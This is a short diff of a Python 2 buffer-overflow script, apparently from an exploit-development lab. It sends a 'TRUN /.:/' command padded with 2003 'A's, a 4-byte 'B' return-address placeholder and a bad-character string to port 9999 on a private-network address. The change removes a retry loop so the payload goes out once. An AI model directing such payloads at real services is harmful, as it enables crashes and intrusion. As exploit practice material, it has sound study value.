@@ -18,13 +18,13 @@ badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x1
 
 shellcode = "A" * 2003 + "B" * 4 + badchars
 
-while True:
-    try:
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.0.143',9999))
-        s.send(('TRUN /.:/' + shellcode))
-        s.close
 
-    except:
-        print "Error connecting to server"
-        sys.exit()
+try:
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('192.168.0.143',9999))
+    s.send(('TRUN /.:/' + shellcode))
+    s.close
+
+except:
+    print "Error connecting to server"
+    sys.exit()
